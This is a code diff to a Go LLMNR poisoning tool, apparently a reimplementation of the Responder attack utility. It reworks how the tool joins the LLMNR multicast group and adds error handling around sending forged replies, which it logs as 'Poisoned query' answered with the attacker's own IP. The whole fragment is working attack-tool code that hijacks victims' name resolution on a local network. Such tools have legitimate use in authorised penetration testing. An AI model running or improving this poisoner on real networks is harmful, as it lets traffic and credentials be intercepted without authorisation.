@@ -1,9 +1,11 @@
 package poisoner
 
 import (
+	"context"
 	"encoding/binary"
 	"fmt"
 	"net"
+	"syscall"
 
 	"go-responder/internal/analyzer"
 	"go-responder/internal/core"
@@ -18,12 +20,32 @@ func PoisonLLMNR(ifaceIP net.IP) {
 		core.LogError("LLMNR: no interface for %s - %v", ifaceIP, err)
 		return
 	}
-	group := &net.UDPAddr{IP: net.ParseIP(llmnrMulticast), Port: llmnrPort}
-	conn, err := net.ListenMulticastUDP("udp4", iface, group)
+	groupIP := net.ParseIP(llmnrMulticast).To4()
+	ip4 := ifaceIP.To4()
+
+	lc := net.ListenConfig{
+		Control: func(network, address string, c syscall.RawConn) error {
+			var ctlErr error
+			c.Control(func(fd uintptr) {
+				mreq := &syscall.IPMreqn{
+					Multiaddr: [4]byte{groupIP[0], groupIP[1], groupIP[2], groupIP[3]},
+					Ifindex:   int32(iface.Index),
+				}
+				if ctlErr = syscall.SetsockoptIPMreqn(int(fd), syscall.IPPROTO_IP, syscall.IP_ADD_MEMBERSHIP, mreq); ctlErr != nil {
+					return
+				}
+
+				ctlErr = syscall.SetsockoptInet4Addr(int(fd), syscall.IPPROTO_IP, syscall.IP_MULTICAST_IF, [4]byte{ip4[0], ip4[1], ip4[2], ip4[3]})
+			})
+			return ctlErr
+		},
+	}
+	pc, err := lc.ListenPacket(context.Background(), "udp4", fmt.Sprintf(":%d", llmnrPort))
 	if err != nil {
-		core.LogError("LLMNR: requires root privileges to join multicast - %v", err)
+		core.LogError("LLMNR: bind :%d failed (root?) - %v", llmnrPort, err)
 		return
 	}
+	conn := pc.(*net.UDPConn)
 	defer conn.Close()
 	core.LogInfo("LLMNR listening on %s (UDP %d, multicast %s)", ifaceIP, llmnrPort, llmnrMulticast)
 
@@ -53,8 +75,11 @@ func PoisonLLMNR(ifaceIP net.IP) {
 		}
 		resp := BuildLLMNRResponse(pkt, ifaceIP)
 		if resp != nil {
-			conn.WriteTo(resp, src)
-			core.LogInfo("[LLMNR] Poisoned query for '%s' - responding with %s", name, ifaceIP)
+			if _, err := conn.WriteToUDP(resp, src); err != nil {
+				core.LogError("[LLMNR] send to %s FAILED: %v", src, err) 
+			} else {
+				core.LogInfo("[LLMNR] Poisoned query for '%s' - responding with %s", name, ifaceIP)
+			}
 		}
 	}
 }
